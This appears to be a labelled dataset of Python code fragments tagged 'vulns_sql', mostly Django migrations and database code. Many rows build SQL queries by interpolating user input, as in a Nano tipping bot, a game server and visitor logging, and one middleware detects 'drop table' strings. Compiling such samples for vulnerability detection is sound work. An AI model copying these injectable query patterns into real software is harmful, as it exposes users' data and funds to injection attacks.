"                ('course_instance', models.ForeignKey(related_name='course_modules', to='course.CourseInstance')),",vulns_sql
"                ('modelwithinheritance_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='inheritance.ModelWithInheritance')),",vulns_sql
"                ('learningobject_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='exercise.LearningObject')),",vulns_sql
"                ('baseexercise_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='exercise.BaseExercise')),",vulns_sql
"                ('baseexercise_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='exercise.BaseExercise')),",vulns_sql
"                ('course_instance', models.ForeignKey(related_name='categories', to='course.CourseInstance')),",vulns_sql
"                ('baseexercise_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='exercise.BaseExercise')),",vulns_sql
"                ('submission', models.ForeignKey(related_name='files', to='exercise.Submission')),",vulns_sql
"                ('baseexercise_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='exercise.BaseExercise')),",vulns_sql
"            field=models.ForeignKey(related_name='submissions', to='exercise.BaseExercise'),            field=models.ForeignKey(related_name='graded_submissions', blank=True, to='userprofile.UserProfile', null=True),",vulns_sql
"            field=models.ForeignKey(related_name='maxsubmissionsruledeviations', to='exercise.BaseExercise'),            field=models.ForeignKey(to='userprofile.UserProfile'),",vulns_sql
"            field=models.ForeignKey(related_name='learning_objects', to='exercise.LearningObjectCategory'),            field=models.ForeignKey(related_name='learning_objects', to='exercise.CourseModule'),            field=models.ForeignKey(related_name='deadlineruledeviations', to='exercise.BaseExercise'),            field=models.ForeignKey(to='userprofile.UserProfile'),",vulns_sql
"            field=models.ForeignKey(to='exercise.BaseExercise'),            field=models.ForeignKey(to='exercise.BaseExercise'),",vulns_sql
"            field=models.ForeignKey(related_name='learning_objects', to='course.LearningObjectCategory'),            field=models.ForeignKey(related_name='learning_objects', to='course.CourseModule'),",vulns_sql
"                ('learningobject_ptr', models.OneToOneField(parent_link=True, primary_key=True, to='exercise.LearningObject', serialize=False, auto_created=True)),",vulns_sql
"            field=models.ForeignKey(related_name='children', null=True, to='exercise.LearningObject', blank=True),",vulns_sql
"                ('baseexercise_ptr', models.OneToOneField(auto_created=True, primary_key=True, serialize=False, parent_link=True, to='exercise.BaseExercise')),                ('lti_service', models.ForeignKey(to='external_services.LTIService')),",vulns_sql
"                ('learning_object', models.ForeignKey(to='exercise.LearningObject')),                ('profile', models.ForeignKey(to='userprofile.UserProfile')),",vulns_sql
    if user.is_authenticated():,vulns_sql
from django.core.urlresolvers import reverse,vulns_sql
        if user.is_authenticated():,vulns_sql
"                ('modelwithinheritance_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='inheritance.ModelWithInheritance')),",vulns_sql
"                ('linkservice_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='external_services.LinkService')),",vulns_sql
"                ('course_instance', models.ForeignKey(related_name='ext_services', to='course.CourseInstance', help_text=b'A course instance where the service is used.')),                ('service', models.ForeignKey(to='external_services.LinkService')),",vulns_sql
"            field=models.ForeignKey(related_name='ext_services', help_text='A course instance where the service is used.', to='course.CourseInstance'),",vulns_sql
"            field=models.ForeignKey(help_text='A course where the menu item exists.', to='course.CourseInstance', related_name='ext_services'),",vulns_sql
"            field=models.ForeignKey(help_text='If preconfigured, an external service to link.', to='external_services.LinkService', null=True, blank=True),",vulns_sql
"                ('content_type', models.ForeignKey(editable=False, to='contenttypes.ContentType', null=True)),",vulns_sql
from django.core.urlresolvers import reverse,vulns_sql
"""""""This middleware is an easter egg! It is invoked when any request parameterscontain the string ""drop table"" (a potential SQL injection) and prevents theuser from loading any pages. Instead, a response with internal server error codeis returned with a ""funny"" error message. The SQL injection attempt is stored inthe session, so that the problem persists even if the user reloads the page.Other users and the actual system are not affected by this middleware.The normal behavior can be restored by giving any request parameter value with thestring ""restore table"" in it.""""""from django.http import HttpResponseServerErrorclass SqlInjectionMiddleware(object):    def process_request(self, request):        for var in request.GET:            val = request.GET.get(var).lower()            if ""drop table"" in val:                request.session[""hack_attempt""] = val            if ""restore table"" in val and ""hack_attempt"" in request.session:                del request.session[""hack_attempt""]        if ""hack_attempt"" in request.session:            return HttpResponseServerError(""Traceback (most recent call last):\nFile \""egg.py\"", line 1337, in aplus\nDatabaseIntegrityError: aHR0cDovL3hrY2QuY29tLzMyNy8= is not a valid base64 table identifier"", cont",vulns_sql
"                ('course_instance', models.ForeignKey(to='course.CourseInstance', related_name='news')),",vulns_sql
            not user.is_authenticated(),vulns_sql
        if not user or not user.is_authenticated():,vulns_sql
"                ('course_instance', models.ForeignKey(to='course.CourseInstance')),                ('recipient', models.ForeignKey(related_name='received_notifications', to='userprofile.UserProfile')),                ('sender', models.ForeignKey(related_name='sent_notifications', to='userprofile.UserProfile')),",vulns_sql
"            field=models.ForeignKey(to='exercise.Submission', blank=True, null=True),",vulns_sql
"            field=models.ForeignKey(related_name='sent_notifications', to='userprofile.UserProfile', blank=True, null=True),",vulns_sql
"            field=models.ForeignKey(blank=True, related_name='notifications', null=True, to='exercise.Submission'),",vulns_sql
from django.core.urlresolvers import reverse,vulns_sql
from django.core.urlresolvers import reverse,vulns_sql
"                ('module', models.ForeignKey(to='course.CourseModule', related_name='requirements')),",vulns_sql
"                ('course_instance', models.ForeignKey(to='course.CourseInstance', related_name='thresholds')),",vulns_sql
"                ('threshold', models.ForeignKey(to='threshold.Threshold', related_name='points')),",vulns_sql
"            field=models.ForeignKey(to='threshold.Threshold'),",vulns_sql
"                ('user', models.OneToOneField(to=settings.AUTH_USER_MODEL)),",vulns_sql
        if user.is_authenticated():,vulns_sql
    if request.user.is_authenticated():,vulns_sql
"    with open('templates/sql/state_array.sql', 'r') as f:        raw_sql = f.read()    t = Template(raw_sql)",vulns_sql
"    with open('templates/sql/attribute_array.sql', 'r') as f:        raw_sql = f.read()    t = Template(raw_sql)    with open('templates/sql/relations_array.sql', 'r') as f:        raw_sql = f.read()    t = Template(raw_sql)",vulns_sql
"    with open('templates/sql/create_object.sql', 'r') as f:        sql_raw = f.read()    sql_template = Template(sql_raw)",vulns_sql
"    with open('templates/sql/passivate_or_delete_object.sql', 'r') as f:        sql_raw = f.read()    sql_template = Template(sql_raw)",vulns_sql
"    with open('templates/sql/passivate_or_delete_object.sql', 'r') as f:        sql_raw = f.read()    sql_template = Template(sql_raw)",vulns_sql
"    with open('templates/sql/update_object.sql', 'r') as f:        sql_raw = f.read()    sql_template = Template(sql_raw)",vulns_sql
"    with open('templates/sql/list_objects.sql', 'r') as f:        sql_raw = f.read()    sql_template = Template(sql_raw)",vulns_sql
            abort(400),vulns_sql
            abort(400),vulns_sql
		self.set_order_by(args)		self.check_sort_by_table(args.order_by),vulns_sql
"	def set_order_by(self, args):		meta = frappe.get_meta(self.doctype)",vulns_sql
"	def check_sort_by_table(self, order_by):		if ""."" in order_by:			tbl = order_by.split('.')[0]			if tbl not in self.tables:				if tbl.startswith('`'):					tbl = tbl[4:-1]				frappe.throw(_(""Please select atleast 1 column from {0} to sort"").format(tbl))",vulns_sql
		self.set_order_by(args)		self.check_sort_by_table(args.order_by),vulns_sql
"	def set_order_by(self, args):		meta = frappe.get_meta(self.doctype)",vulns_sql
"	def check_sort_by_table(self, order_by):		if ""."" in order_by:			tbl = order_by.split('.')[0]			if tbl not in self.tables:				if tbl.startswith('`'):					tbl = tbl[4:-1]				frappe.throw(_(""Please select atleast 1 column from {0} to sort"").format(tbl))",vulns_sql
		self.set_order_by(args)		self.check_sort_by_table(args.order_by),vulns_sql
"	def set_order_by(self, args):		meta = frappe.get_meta(self.doctype)",vulns_sql
"	def check_sort_by_table(self, order_by):		if ""."" in order_by:			tbl = order_by.split('.')[0]			if tbl not in self.tables:				if tbl.startswith('`'):					tbl = tbl[4:-1]				frappe.throw(_(""Please select atleast 1 column from {0} to sort"").format(tbl))",vulns_sql
		self.set_order_by(args)		self.check_sort_by_table(args.order_by),vulns_sql
"	def set_order_by(self, args):		meta = frappe.get_meta(self.doctype)",vulns_sql
"	def check_sort_by_table(self, order_by):		if ""."" in order_by:			tbl = order_by.split('.')[0]			if tbl not in self.tables:				if tbl.startswith('`'):					tbl = tbl[4:-1]				frappe.throw(_(""Please select atleast 1 column from {0} to sort"").format(tbl))",vulns_sql
		self.set_order_by(args)		self.check_sort_by_table(args.order_by),vulns_sql
"	def set_order_by(self, args):		meta = frappe.get_meta(self.doctype)",vulns_sql
"	def check_sort_by_table(self, order_by):		if ""."" in order_by:			tbl = order_by.split('.')[0]			if tbl not in self.tables:				if tbl.startswith('`'):					tbl = tbl[4:-1]				frappe.throw(_(""Please select atleast 1 column from {0} to sort"").format(tbl))",vulns_sql
				 ' or '.join(self.or_conditions),vulns_sql
"		regex = re.compile('^.*[,();].*')",vulns_sql
"			if regex.match(field):				if any(keyword in field.lower() for keyword in blacklisted_keywords):				if any(""{0}("".format(keyword) in field.lower() \					for keyword in blacklisted_functions):",vulns_sql
	return event,vulns_sql
"        cr.execute("""""" select id from account_journal                            where auto_cash='True' and type='cash'                            and id in (%s)"""""" %(','.join(map(lambda x: ""'"" + str(x) + ""'"", j_ids))))        journal_ids = map(lambda x1: x1[0], cr.fetchall())",vulns_sql
"        cr.execute("""""" select id from account_journal                            where auto_cash='True' and type='cash'                            and id in (%s)"""""" %(','.join(map(lambda x: ""'"" + str(x) + ""'"", j_ids))))        journal_ids = map(lambda x1: x1[0], cr.fetchall())",vulns_sql
"        cr.execute("""""" select id from account_journal                            where auto_cash='True' and type='cash'                            and id in (%s)"""""" %(','.join(map(lambda x: ""'"" + str(x) + ""'"", j_ids))))        journal_ids = map(lambda x1: x1[0], cr.fetchall())",vulns_sql
"        cr.execute("""""" select id from account_journal                            where auto_cash='True' and type='cash'                            and id in (%s)"""""" %(','.join(map(lambda x: ""'"" + str(x) + ""'"", j_ids))))        journal_ids = map(lambda x1: x1[0], cr.fetchall())",vulns_sql
"        cr.execute("""""" select id from account_journal                            where auto_cash='True' and type='cash'                            and id in (%s)"""""" %(','.join(map(lambda x: ""'"" + str(x) + ""'"", j_ids))))        journal_ids = map(lambda x1: x1[0], cr.fetchall())",vulns_sql
"        cr.execute("""""" select id from account_journal                            where auto_cash='True' and type='cash'                            and id in (%s)"""""" %(','.join(map(lambda x: ""'"" + str(x) + ""'"", j_ids))))        journal_ids = map(lambda x1: x1[0], cr.fetchall())",vulns_sql
"        cr.execute("""""" select id from account_journal                            where auto_cash='True' and type='cash'                            and id in (%s)"""""" %(','.join(map(lambda x: ""'"" + str(x) + ""'"", j_ids))))        journal_ids = map(lambda x1: x1[0], cr.fetchall())",vulns_sql
"        cr.execute("""""" select id from account_journal                            where auto_cash='True' and type='cash'                            and id in (%s)"""""" %(','.join(map(lambda x: ""'"" + str(x) + ""'"", j_ids))))        journal_ids = map(lambda x1: x1[0], cr.fetchall())",vulns_sql
"        from_date=context.get('from_date',False)        to_date=context.get('to_date',False)        date_str=False            date_str=""date_planned>='%s' and date_planned<='%s'""%(from_date,to_date)            date_str=""date_planned>='%s'""%(from_date)            date_str=""date_planned<='%s'""%(to_date)",vulns_sql
"                'group by product_id,product_uom',(tuple(location_ids),tuple(location_ids),tuple(ids),tuple(states),)            )",vulns_sql
"                'group by product_id,product_uom',(tuple(location_ids),tuple(location_ids),tuple(ids),tuple(states),)            )",vulns_sql
"        cr.execute("""""" select id from account_journal                            where auto_cash='True' and type='cash'                            and id in (%s)"""""" %(','.join(map(lambda x: ""'"" + str(x) + ""'"", j_ids))))        journal_ids = map(lambda x1: x1[0], cr.fetchall())",vulns_sql
"        cr.execute("""""" select id from account_journal                            where auto_cash='True' and type='cash'                            and id in (%s)"""""" %(','.join(map(lambda x: ""'"" + str(x) + ""'"", j_ids))))        journal_ids = map(lambda x1: x1[0], cr.fetchall())",vulns_sql
"        sql_str = ""SELECT id FROM wins_completed_wins_fy""        if self.end_date:            sql_str = f""{sql_str} where created <= '{self.end_date.strftime('%m-%d-%Y')}'""            cursor.execute(sql_str)",vulns_sql
"        self, user_id, username, hashed_password, roll_id=1, *args, **kwargs",vulns_sql
"            if connection.execute(s, username=username).fetchone() is None",vulns_sql
"    return response.json(        JoggingResult.load(user_id, q_filter, page, limit), status=200    )",vulns_sql
"    resp = await test_cli.get(""/results?page=0&count=2"", headers=headers)    resp = await test_cli.get(""/results?page=1&count=1"", headers=headers)",vulns_sql
"    resp = await test_cli.get(""/results?page=-1&count=2"", headers=headers)    resp = await test_cli.get(""/results?page=1&count=0"", headers=headers)",vulns_sql
"        ""/results?page=0&count=2&filter=date eq '2019-07-15'"", headers=headers",vulns_sql
"        return getHTML(name)",vulns_sql
"                        %s,                        %s,                        %s                ''' % (source[""serial_id""], 0, source[""prev_etotal""])                self.c.execute(query)                        Name='%s',                         Type='%s',                         SW_Version='%s',                         Status='%s',                        TimeStamp='%s'                    WHERE Serial='%s';                ''' % (source[""name""], source[""inverter_type""], ""s0-bridge v0"", ""OK"", int(datetime.now().timestamp()), source[""serial_id""] )                self.c.execute(query)",vulns_sql
"                   %s,                   %s,                   %s,                   %s            ''' % (ts, inv_serial, data['power'],  prev_etotal + data['energy'])            self.c.execute(query)           WHERE Serial = '%s'        ''' % (inverter_serial)        self.c.execute(query)",vulns_sql
"                TimeStamp='%s',                 Status='%s',                 eToday='%s',                eTotal='%s'            WHERE Serial='%s';        ''' % (ts, status, etoday, etotal, inverter_serial)        self.c.execute(query)",vulns_sql
"                %s,                %s,                %s,                %s        ''' % (y_ts, inverter_serial, etoday, etotal)        self.c.execute(query)",vulns_sql
"                    %s,                    %s,                    %s            ''' % (ts, 0, 0)            self.c.execute(query)                EnergyUsed = EnergyUsed + %s,                PowerUsed = PowerUsed + %s                WHERE TimeStamp = %s;            ''' % (energy_used, power_used, ts)            self.c.execute(query)",vulns_sql
"            f""insert into visitors (ip_address, user_agent, referrer, full_path, visit_time) values ('{self.ip_address}', '{self.user_agent}', '{self.referrer}', '{self.full_path}', '{self.visit_time}');"")",vulns_sql
"                f""insert into applicants (email, registration_time) values ('{self.email}', '{self.registration_time}');"")",vulns_sql
                for malt_row in cursor.execute('SELECT * FROM Malts WHERE recipe_name=\'%s\'' % recipe.name):                for rest_row in cursor.execute('SELECT * FROM Rests WHERE recipe_name=\'%s\' ORDER BY position ASC' % recipe.name):                for hop_dosage_row in cursor.execute('SELECT * FROM HopDosages WHERE recipe_name=\'%s\'' % recipe.name):,vulns_sql
"",vulns_sql
"        cursor.execute(""INSERT INTO Users VALUES (""+username+"",""+ name+"",""+ hashedPassword"")"")",vulns_sql
        notes = [],vulns_sql
"                await cursor.execute(\                    ""INSERT INTO player (name, password, lv, xp, hp) values ('%s', '%s', 1, 0, 150)""\                    % (name, password))",vulns_sql
"                await cursor.execute(""SELECT uid, name, password, lv, xp, hp FROM player where name = '%s'"" % name)",vulns_sql
"    loop.run_until_complete(create_item(37, 0))",vulns_sql
"    cursor.execute(""SELECT player1,player2,size,state FROM games WHERE id = %d;"" % game)",vulns_sql
"    cursor.execute(""SELECT x,y,letter FROM moves WHERE gameID = %d;"" % game)",vulns_sql
"    cursor.execute(""""""INSERT INTO games(player1,player2,size) VALUES(""%s"",""%s"",%d);"""""" % (player1,player2,size))",vulns_sql
"        cursor.execute(""""""UPDATE games SET state=""%s:resignation"" WHERE id=%d;"""""" % (other_player_name,game))",vulns_sql
"        cursor.execute(""""""INSERT INTO moves(gameID,x,y,letter,time) VALUES(%d,%d,%d,""%s"",NOW());"""""" % (game,x,y,letter))",vulns_sql
"            cursor.execute(""""""UPDATE games SET state=""%s"" WHERE id=%d;"""""" % (result,game))",vulns_sql
"    cursor.execute(""SELECT player1,player2,size,state FROM games WHERE id = %d;"", (game,))",vulns_sql
"    cursor.execute(""SELECT x,y,letter FROM moves WHERE gameID = %d;"", (game,))",vulns_sql
"    cursor.execute(""""""INSERT INTO games(player1,player2,size) VALUES(""%s"",""%s"",%d);"""""", (player1,player2,size))",vulns_sql
"        cursor.execute(""""""UPDATE games SET state=""%s:resignation"" WHERE id=%d;"""""", (other_player_name,game))",vulns_sql
"        cursor.execute(""""""INSERT INTO moves(gameID,x,y,letter,time) VALUES(%d,%d,%d,""%s"",NOW());"""""", (game,x,y,letter))",vulns_sql
"            cursor.execute(""""""UPDATE games SET state=""%s"" WHERE id=%d;"""""", (result,game))",vulns_sql
"import prawimport timefrom datetime import datetimefrom time import sleepfrom rpc_bindings import send, open_account, generate_account, generate_qr, nano_to_raw, receive_all, send_all, \    check_balance, validate_address, open_or_receiveimport mysql.connectorimport pprintcomment_footer = """"""\n\n*Nano Tipper Z Bot v0.1. Replies to this comment might be treated as PM commands. This program is in beta testing, and your funds could be lost.*""""""help_text = """"""Nano Tipper Z Bot v0.1. Use at your own risk, and don't put in more Nano than you're willing to lose.\n\nTo perform a command, create a new message with any of the following commands in the message body.\n\n'create' - Create a new account if one does not exist\n\n'private_key' -  (disabled) Retrieve your account private key\n\n'new_address' - (disabled) If you feel this address was compromised, create a new account and key\n\n'send <amount> <user/address> - Send Nano to a reddit user or an address\n\n'receive' - Receive all pending transactions\n\n'balance' - Retrieve your account balance. Includes both pocketed and unpocketed transactions.\n\n'minimum <amount>' - Sets a minimum amount for receiving tips. Program minimum is 0.001 Nano.\n\n'help' - Get this help message\n\n\nIf you have any questions or bug fixes, please contact /u/zily88.""""""reddit = praw.Reddit('bot1')subreddit = reddit.subreddit(""nano_tipper_z+cryptocurrency247"")tip_froms = []tip_parents = []tip_tos = []tip_comments = []tip_amounts = []last_action = time.time()program_minimum = 0.001recipient_minimum = 0.01with open('sql_password.txt') as f:    sql_password = f.read()mydb = mysql.connector.connect(user='root', password=sql_password,                              host='localhost',                              auth_plugin='mysql_native_password', database='nano_tipper_z')mycursor = mydb.cursor()def stream_comments_messages():    previous_comments = {comment for comment in subreddit.comments()}    previous_messages = {message for message in reddit.inbox.unread()}    print('received first stream')    while True:        sleep(6)        global last_action        last_action = time.time()        updated_comments = {comment for comment in subreddit.comments()}        new_comments = updated_comments - previous_comments        previous_comments = updated_comments        updated_messages = {message for message in reddit.inbox.unread()}        new_messages = updated_messages - previous_messages        previous_messages = updated_messages        if len(new_comments) >= 1:            for new_comment in new_comments:                print('full name: ', new_comment.name)                if new_comment.name[:3] == 't1_':                    yield ('comment', new_comment)        if len(new_messages) >= 1:            for new_message in new_messages:                print('full name: ', new_message.name)                if new_message.name[:3] == 't4_':                    yield ('message', new_message)        else:            yield Nonedef update_history():    return Nonedef add_history_record(username=None, action=None, sql_time=None, address=None, comment_or_message=None,                       recipient_username=None, recipient_address=None, amount=None, hash=None, comment_id=None,                       notes=None, reddit_time=None, comment_text=None):    if sql_time is None:        sql_time = time.strftime('%Y-%m-%d %H:%M:%S')    sql = ""INSERT INTO history (username, action, sql_time, address, comment_or_message, recipient_username, "" \          ""recipient_address, amount, hash, comment_id, notes, reddit_time, comment_text) VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s)""    val = (username, action, sql_time, address, comment_or_message, recipient_username, recipient_address, amount,           hash, comment_id, notes, reddit_time, comment_text)    mycursor.execute(sql, val)    mydb.commit()    return mycursor.lastrowiddef check_registered_by_address(address):    address = address.split('_')[1]    mycursor.execute(""SELECT username FROM accounts WHERE address='%s'"" % ('xrb_' + address))    result = mycursor.fetchall()    if len(result) > 0:        return result[0][0]    mycursor.execute(""SELECT username FROM accounts WHERE address='%s'"" % ('nano_' + address))    result = mycursor.fetchall()    if len(result) > 0:        return result[0][0]    return Nonedef add_new_account(username):    address = generate_account()    private = address['private']    address = address['account']    print(type(private), type(address), type(username))    print(private, address, username)    sql = ""INSERT INTO accounts (username, private_key, address, minimum) VALUES (%s, %s, %s, %s)""    val = (username, private, address, nano_to_raw(0.01))    mycursor.execute(sql, val)    mydb.commit()    return addressdef handle_create(message):    message_time = datetime.utcfromtimestamp(message.created_utc)  # time the reddit message was created    add_history_record(        username=str(message.author),        comment_or_message='message',        reddit_time=message_time.strftime('%Y-%m-%d %H:%M:%S'),        action='create',        comment_text=str(message.body)[:255]    )    username = str(message.author)    mycursor.execute(""SELECT address FROM accounts WHERE username='%s'"" % username)    result = mycursor.fetchall()    if len(result) is 0:        address = add_new_account(username)        response = ""Hi! I have created a new account for you. Your Nano address is %s. Once Nano is sent to your new account,"" \                   "" your balance will be"" \                   "" unpocketed until you respond and have 'receive' in the message body.\n\nhttps://www.nanode.co/account/%s"" % (address, address)    else:        response = ""It looks like you already have an account made. Your Nano address is %s. Once Nano is sent to your account, your balance will be"" \                 "" unpocketed until you respond and have 'receive' in the message body.\n\nhttps://www.nanode.co/account/%s"" % (result[0][0], result[0][0])    x = reddit.redditor(username).message('Nano Tipper Z: Account Creation', response)def handle_private_key(message):    author = str(message.author)    message_time = datetime.utcfromtimestamp(message.created_utc)  # time the reddit message was created    add_history_record(        username=str(message.author),        comment_or_message='message',        reddit_time=message_time.strftime('%Y-%m-%d %H:%M:%S'),        action='private_key',        comment_text=str(message.body)[:255]    )    mycursor.execute(""SELECT address, private_key FROM accounts WHERE name='%s'"" %author)    result = mycursor.fetchall()    if len(result) > 0:        response = 'Your account: %s\n\nYour private key: %s'%(result[0][0],result[0][1])        x = reddit.redditor(username).message('New Private Key', response)        return None    else:        x = reddit.redditor(username).message(""No account found."",""You do not currently have an account open.""                                                                ""To create one, respond with the text 'create' in the message body."")        return Nonedef handle_balance(message):    username = str(message.author)    message_time = datetime.utcfromtimestamp(message.created_utc)  # time the reddit message was created    add_history_record(        username=str(message.author),        comment_or_message='message',        reddit_time=message_time.strftime('%Y-%m-%d %H:%M:%S'),        action='balance',        comment_text=str(message.body)[:255]    )    mycursor.execute(""SELECT address FROM accounts WHERE username='%s'"" % username)    result = mycursor.fetchall()    if len(result)>0:        results = check_balance(result[0][0])        response = ""At address %s, you currently have %s Nano available, and %s Nano unpocketed. To pocket any, create a new "" \                   ""message containing the word 'receive'\n\nhttps://www.nanode.co/account/%s"" % (result[0][0], results[0]/10**30, results[1]/10**30,result[0][0])        reddit.redditor(username).message('Nano Tipper Z account balance', response)        return None    reddit.redditor(username).message('Nano Tipper Z: No account registered.', 'You do not have an open account yet')def handle_new_address(message):    message_time = datetime.utcfromtimestamp(message.created_utc)  # time the reddit message was created    add_history_record(        username=str(message.author),        comment_or_message='message',        action='new_address',        reddit_time=message_time.strftime('%Y-%m-%d %H:%M:%S'),        comment_text=str(message.body)[:255]    )    message.reply('not activated yet.')def handle_send(message):    parsed_text = str(message.body).lower().replace('\\', '').split('\n')[0].split(' ')    response = handle_send_nano(message, parsed_text, 'message')    message.reply(response + comment_footer)def handle_send_nano(message, parsed_text, comment_or_message):    user_or_address = '' # either 'user' or 'address', depending on how the recipient was specified    private_key = ''    adrress = ''    recipient = ''    recipient_username = ''    recipient_address = ''    message_time = datetime.utcfromtimestamp(message.created_utc) # time the reddit message was created    username = str(message.author) # the sender    entry_id = add_history_record(        username=username,        action='send',        comment_or_message=comment_or_message,        comment_id=message.id,        reddit_time=message_time.strftime('%Y-%m-%d %H:%M:%S'),        comment_text=str(message.body)[:255]        )    if len(parsed_text) >= 3:        amount = parsed_text[1]        recipient = parsed_text[2]    elif len(parsed_text) == 2:        pass    else:        sql = ""UPDATE history SET notes = %s WHERE id = %s""        val = ('could not find tip amount', entry_id)        mycursor.execute(sql, val)        mydb.commit()        return 'Could not read your tip or send command, or find an amount. Be sure the amount and recipient are separated by a space.'    if parsed_text[1].lower() == 'nan' or ('inf' in parsed_text[1].lower()):        sql = ""UPDATE history SET notes = %s WHERE id = %s""        val = ('could not parse amount', entry_id)        mycursor.execute(sql, val)        mydb.commit()        return ""Could not read your tip or send amount. Is '%s' a number?"" % parsed_text[1]    try:        amount = float(parsed_text[1])    except:        sql = ""UPDATE history SET notes = %s WHERE id = %s""        val = ('could not parse amount', entry_id)        mycursor.execute(sql, val)        mydb.commit()        return ""Could not read your tip or send amount. Is '%s' a number?"" % parsed_text[1]    if amount < program_minimum:        sql = ""UPDATE history SET notes = %s WHERE id = %s""        val = ('amount below program limit', entry_id)        mycursor.execute(sql, val)        mydb.commit()        return 'You must send amounts of Nano above the program limit of %s.' % program_minimum    mycursor.execute(""SELECT address, private_key FROM accounts WHERE username='%s'"" % username)    result = mycursor.fetchall()    if len(result) < 1:        sql = ""UPDATE history SET notes = %s WHERE id = %s""        val = ('sender does not have an account', entry_id)        mycursor.execute(sql, val)        mydb.commit()        return 'You do not have a tip bot account yet. To create one, send me a PM containing the'\               "" text 'create' in the message body, or get a tip from a fellow redditor!.""    else:        address = result[0][0]        private_key = result[0][1]        results = check_balance(result[0][0])        if nano_to_raw(amount) > results[0]:            sql = ""UPDATE history SET notes = %s WHERE id = %s""            val = ('insufficient funds', entry_id)            mycursor.execute(sql, val)            mydb.commit()            return 'You have insufficient funds. Your account has %s pocketed (+%s unpocketed) and you are '\                          'trying to send %s. If you have unpocketed funds, create a new message containing the text'\                          ' ""receive"" to pocket your incoming money.'%(results[0]/10**30, results[1]/10**30, amount)    if len(parsed_text) == 2:        if comment_or_message == 'comment':            recipient = str(message.parent().author)        else:            sql = ""UPDATE history SET notes = %s, WHERE id = %s""            val = (""no recipient specified"", entry_id)            mycursor.execute(sql, val)            mydb.commit()            return ""You must specify an amount and a user.""    if recipient[:3].lower() == '/u/':        recipient = recipient[3:]        print(recipient)    if (recipient[:5].lower() == ""nano_"") or (recipient[:4].lower() == ""xrb_""):        success = validate_address(recipient)        if success['valid'] == '1':            user_or_address = 'address'        else:            try:                print(getattr(reddit.redditor(recipient), 'is_suspended', False))                user_or_address = 'user'            except:                sql = ""UPDATE history SET notes = %s WHERE id = %s""                val = ('invalid address or address-like redditor does not exist', entry_id)                mycursor.execute(sql, val)                mydb.commit()                return '%s is neither a valid address or redditor' % recipient    else:        try:            print(getattr(reddit.redditor(recipient), 'is_suspended', False))            user_or_address = 'user'        except:            sql = ""UPDATE history SET notes = %s WHERE id = %s""            val = ('redditor does not exist', entry_id)            mycursor.execute(sql, val)            mydb.commit()            return ""Could not find redditor %s. Make sure you aren't writing or copy/pasting markdown."" % recipient    user_minimum = -1    if user_or_address == 'user':        recipient_username = recipient        sql = ""SELECT minimum, address FROM accounts WHERE username = %s""        val = (recipient_username,)        mycursor.execute(sql, val)        myresult = mycursor.fetchall()        if len(myresult) > 0:            print(myresult[0])            user_minimum = int(myresult[0][0])            recipient_address = myresult[0][1]    else:        recipient_address = recipient        recipient_username = check_registered_by_address(recipient_address)        if recipient_username:            sql = ""SELECT minimum, address FROM accounts WHERE username = %s""            val = (recipient_username,)            mycursor.execute(sql, val)            myresult = mycursor.fetchall()            print(myresult[0])            user_minimum = float(myresult[0][0])    if (user_minimum >= 0) and recipient_address and recipient_username:        if nano_to_raw(amount) < user_minimum:            sql = ""UPDATE history SET notes = %s WHERE id = %s""            val = (""below user minimum"", entry_id)            mycursor.execute(sql, val)            mydb.commit()            return ""Sorry, the user has set a tip minimum of %s. Your tip of %s is below this amount.""%(user_minimum/10**30, amount)        if user_or_address == 'user':            notes = ""sent to registered redditor""        else:            notes = ""sent to registered address""        receiving_new_balance = check_balance(recipient_address)        sql = ""UPDATE history SET notes = %s, address = %s, username = %s, recipient_username = %s, recipient_address = %s, amount = %s WHERE id = %s""        val = (notes, address, username, recipient_username, recipient_address, str(nano_to_raw(amount)), entry_id)        mycursor.execute(sql, val)        mydb.commit()        print(""Sending Nano: "", address, private_key, nano_to_raw(amount), recipient_address, recipient_username)        sent = send(address, private_key, nano_to_raw(amount), recipient_address)        print(""Hash: "", sent)        sql = ""UPDATE history SET hash = %s WHERE id = %s""        val = (sent['hash'], entry_id)        mycursor.execute(sql, val)        mydb.commit()        x = reddit.redditor(recipient_username).message('You just received a new Nano tip!',                                                    'You have been tipped %s Nano at your address of %s. Your new account balance will be '                                                    '%s received and %s unpocketed.' % (                                                    amount, recipient_address, receiving_new_balance[0] / 10 ** 30,                                                    (receiving_new_balance[1] / 10 ** 30 + amount)))        if user_or_address == 'user':            return ""Sent %s Nano to %s."" % (amount, recipient_username)        else:            return ""Sent %s Nano to %s."" % (amount, recipient_address)    elif recipient_address:        sql = ""UPDATE history SET notes = %s, address = %s, username = %s, recipient_address = %s, amount = %s WHERE id = %s""        val = (            'sent to unregistered address', address, username, recipient_address, str(nano_to_raw(amount)), entry_id)        mycursor.execute(sql, val)        mydb.commit()        print(""Sending Unregistered Address: "", address, private_key, nano_to_raw(amount), recipient_address)        sent = send(address, private_key, nano_to_raw(amount), recipient_address)        print(""Hash: "", sent)        sql = ""UPDATE history SET hash = %s WHERE id = %s""        val = (sent['hash'], entry_id)        mycursor.execute(sql, val)        mydb.commit()        return ""Sent %s Nano to address %s."" % (amount, recipient_address)    else:        recipient_address = add_new_account(recipient_username)        x = reddit. \            redditor(recipient_username). \            message('Congrats on receiving your first Nano Tip!',                    'Welcome to Nano Tip Bot! You have just received a Nano tip in the amount of %s at your address '                    'of %s. Here is some boilerplate.\n\n' % (                    amount, recipient_address) + help_text)        sql = ""UPDATE history SET notes = %s, address = %s, username = %s, recipient_username = %s, recipient_address = %s, amount = %s WHERE id = %s""        val = (        ""new user created"", address, username, recipient_username, recipient_address, str(nano_to_raw(amount)), entry_id)        mycursor.execute(sql, val)        mydb.commit()        sent = send(address, private_key, nano_to_raw(amount), recipient_address)        print(""Hash: "", sent)        sql = ""UPDATE history SET hash = %s WHERE id = %s""        val = (sent['hash'], entry_id)        mycursor.execute(sql, val)        mydb.commit()        print(""Sending New Account Address: "", address, private_key, nano_to_raw(amount), recipient_address, recipient_username)        return ""Creating a new account for %s and ""\                      ""sending %s Nano."" % 